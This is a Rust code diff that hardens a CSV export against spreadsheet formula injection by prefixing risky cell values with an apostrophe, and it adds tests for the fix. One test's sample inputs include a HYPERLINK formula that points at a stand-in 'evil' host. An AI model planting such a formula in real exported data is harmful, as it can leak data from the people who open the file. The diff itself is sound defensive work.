@@ -117,18 +117,36 @@ fn cell(row: &ItemRow, column: &str, include_raw: bool) -> String {
 }
 
 fn value_to_cell(value: Option<&Value>) -> String {
-    match value {
+    let text = match value {
         None | Some(Value::Null) => String::new(),
         Some(Value::String(s)) => s.clone(),
         Some(other) => other.to_string(),
-    }
+    };
+    neutralize_formula_trigger(text)
 }
 
 fn value_to_cell_owned(value: &Value) -> String {
-    match value {
+    let text = match value {
         Value::String(s) => s.clone(),
         other => other.to_string(),
+    };
+    neutralize_formula_trigger(text)
+}
+
+/// Neutralizes a spreadsheet-formula trigger (CWE-1236). Excel/Sheets/
+/// LibreOffice interpret a cell whose content begins with `=`, `+`, `-`,
+/// or `@` as a formula, regardless of the CSV writer's own delimiter
+/// quoting (which only escapes commas/quotes, not formula semantics).
+/// Item content here is externally-sourced (post bodies, titles, tags
+/// from whatever service backed it up) and not trusted, so every cell
+/// value is checked before being written — prefixing a leading `'`,
+/// which every spreadsheet application treats as "force text", defeats
+/// formula evaluation while leaving the visible content unchanged.
+fn neutralize_formula_trigger(mut s: String) -> String {
+    if s.starts_with(['=', '+', '-', '@']) {
+        s.insert(0, '\'');
     }
+    s
 }
 
 fn csv_err(e: ::csv::Error) -> DbsError {
@@ -233,6 +251,50 @@ mod tests {
         let deleted_idx = headers.iter().position(|h| h == "deleted").unwrap();
         assert_eq!(&record[tags_idx], "a, b, c");
         assert_eq!(&record[deleted_idx], "1");
+    }
+
+    #[test]
+    fn a_title_starting_with_a_formula_trigger_is_neutralized() {
+        for payload in [
+            "=HYPERLINK(\"http://evil/leak\",\"x\")",
+            "+1+1",
+            "-2-2",
+            "@SUM(1,1)",
+        ] {
+            let mut r = row("e1");
+            r.insert("title".to_string(), Value::from(payload));
+            let source = FakeSource { items: vec![r] };
+            let (text, _result) = write_to_string(&source, &ExportQuery::default());
+            let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
+            let mut reader = ::csv::Reader::from_reader(body.as_bytes());
+            let headers = reader.headers().unwrap().clone();
+            let record = reader.records().next().unwrap().unwrap();
+            let idx = headers.iter().position(|h| h == "title").unwrap();
+            // The visible content survives (minus the neutralizing prefix)
+            // but the cell no longer begins with a formula-trigger
+            // character -- a spreadsheet application must never evaluate
+            // it as a formula.
+            assert_eq!(&record[idx], format!("'{payload}"));
+            assert!(
+                !record[idx].starts_with(['=', '+', '-', '@']),
+                "{}",
+                &record[idx]
+            );
+        }
+    }
+
+    #[test]
+    fn a_title_not_starting_with_a_formula_trigger_is_unchanged() {
+        let mut r = row("e1");
+        r.insert("title".to_string(), Value::from("ordinary title"));
+        let source = FakeSource { items: vec![r] };
+        let (text, _result) = write_to_string(&source, &ExportQuery::default());
+        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
+        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
+        let headers = reader.headers().unwrap().clone();
+        let record = reader.records().next().unwrap().unwrap();
+        let idx = headers.iter().position(|h| h == "title").unwrap();
+        assert_eq!(&record[idx], "ordinary title");
     }
 
     #[test]
